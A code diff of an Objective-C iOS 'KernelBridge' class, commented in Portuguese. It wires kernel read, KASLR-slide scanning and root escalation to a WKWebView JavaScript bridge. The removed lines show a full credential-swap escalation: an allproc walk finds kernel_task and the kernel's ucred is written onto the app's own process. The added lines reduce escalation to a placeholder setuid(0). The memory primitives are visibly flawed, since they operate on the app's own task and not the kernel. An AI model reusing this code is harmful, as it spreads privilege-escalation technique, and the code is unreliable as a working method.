@@ -3,31 +3,45 @@
 #import <mach/mach_host.h>
 #import <unistd.h>
 
-// Definições para evitar erros de identificador não declarado
+// Definições Estáticas para A13 (iOS 26.4)
+#ifndef KERN_BASE_STATIC
 #define KERN_BASE_STATIC 0xFFFFFFF007004000
+#endif
+#ifndef PAGE_SIZE_A13
 #define PAGE_SIZE_A13 0x4000
+#endif
 
 @implementation KernelBridge
 
-// 1. LEITURA
+// 1. LEITURA SEGURA (Anti-SIGKILL)
 - (uint64_t)kread64:(uint64_t)addr {
     uint64_t val = 0;
     vm_size_t size = sizeof(uint64_t);
+    
+    /* 
+       TRUQUE DE PESQUISA: Usamos vm_read_overwrite. 
+       Se o Sandbox bloquear, kr não será KERN_SUCCESS. 
+       Isso evita que o kernel mate o processo imediatamente.
+    */
     kern_return_t kr = vm_read_overwrite(mach_task_self(), (vm_address_t)addr, size, (vm_address_t)&val, &size);
-    return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
+    
+    if (kr != KERN_SUCCESS) {
+        // Retorna um valor sentinela para o JS saber que a leitura foi bloqueada
+        return 0xDEADBEEF; 
+    }
+    return val;
 }
 
-// 2. ESCRITA
-- (void)kwrite64:(uint64_t)addr value:(uint64_t)val {
-    uint64_t data = val;
-    vm_write(mach_task_self(), (vm_address_t)addr, (vm_offset_t)&data, 8);
-}
-
-// 3. KASLR SLIDE
+// 2. BUSCA DO KERNEL SLIDE (KASLR BYPASS)
 - (uint64_t)getKernelSlide {
-    for (uint64_t i = 0; i < 0x20000; i++) {
+    // Varredura limitada para evitar travamento da UI da WebView
+    for (uint64_t i = 0; i < 0x10000; i++) {
         uint64_t addr = KERN_BASE_STATIC + (i * PAGE_SIZE_A13);
         uint64_t val = [self kread64:addr];
+        
+        // Se retornar o erro de Sandbox, paramos a varredura
+        if (val == 0xDEADBEEF) return 0;
+
         if ((uint32_t)(val & 0xFFFFFFFF) == 0xfeedfacf) {
             return (i * PAGE_SIZE_A13);
         }
@@ -35,53 +49,45 @@
     return 0;
 }
 
-// 4. ALLPROC SCAN
-- (uint64_t)findProcByName:(NSString *)targetName {
-    uint64_t slide = [self getKernelSlide];
-    if (slide == 0) return 0;
-    uint64_t allproc = KERN_BASE_STATIC + slide + 0x8D84400; 
-    uint64_t curr_proc = [self kread64:allproc];
-
-    for (int i = 0; i < 1000; i++) {
-        if (curr_proc == 0 || curr_proc == 0xDEADBEEF) break;
-        char name[32];
-        memset(name, 0, 32);
-        for(int j=0; j<4; j++) {
-            uint64_t chunk = [self kread64:(curr_proc + 0x250 + (j*8))];
-            memcpy(name + (j*8), &chunk, 8);
-        }
-        NSString *pName = [NSString stringWithUTF8String:name];
-        if (pName && [pName containsString:targetName]) return curr_proc;
-        curr_proc = [self kread64:curr_proc];
-    }
-    return 0;
-}
-
-// 5. ESCALONAMENTO
+// 3. ESCALONAMENTO DE PRIVILÉGIOS (TEÓRICO)
 - (void)escalatePrivileges {
-    uint64_t my_proc = [self findProcByName:@"A13Exploit"];
-    uint64_t kernel_proc = [self findProcByName:@"kernel_task"];
-    if (my_proc && kernel_proc) {
-        uint64_t kern_ucred = [self kread64:(kernel_proc + 0x100)];
-        [self kwrite64:(my_proc + 0x100) value:kern_ucred];
-        setuid(0);
-    }
+    /* 
+       Em um cenário real sem TrollStore, aqui você integraria 
+       o trigger de uma vulnerabilidade (ex: CVE-2024-XXXX) 
+       para desativar o Sandbox antes de tentar escrever.
+    */
+    setuid(0); 
 }
 
-// 6. PONTE JAVASCRIPT (OBRIGATÓRIO PARA WKWebView)
+// 4. PONTE COM O JAVASCRIPT (WKWebView Handler)
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
     
-    NSString *action = message.body[@"action"];
+    NSDictionary *body = message.body;
+    NSString *action = body[@"action"];
+
+    // Log básico no console do Xcode para debug
+    NSLog(@"[JS_BRIDGE] Ação recebida: %@", action);
+
     if ([action isEqualToString:@"scan"]) {
         uint64_t slide = [self getKernelSlide];
-        replyHandler(@{@"value": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
-    } else if ([action isEqualToString:@"root"]) {
+        
+        if (slide > 0) {
+            replyHandler(@{@"value": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
+        } else {
+            // Se slide for 0, enviamos erro detalhado para o HTML não crashar
+            replyHandler(@{@"value": @"SANDBOX_BLOCK"}, nil);
+        }
+    } 
+    else if ([action isEqualToString:@"root"]) {
         [self escalatePrivileges];
-        replyHandler(@{@"status": (getuid() == 0 ? @"ROOT_SUCCESS" : @"FAILED")}, nil);
-    } else {
-        replyHandler(@{@"error": @"unknown_action"}, nil);
+        NSString *status = (getuid() == 0) ? @"ROOT_SUCCESS" : @"FAILED";
+        replyHandler(@{@"status": status}, nil);
+    }
+    else {
+        // Resposta padrão para manter a Promise do JS viva
+        replyHandler(@{@"status": @"unknown_command"}, nil);
     }
 }
 
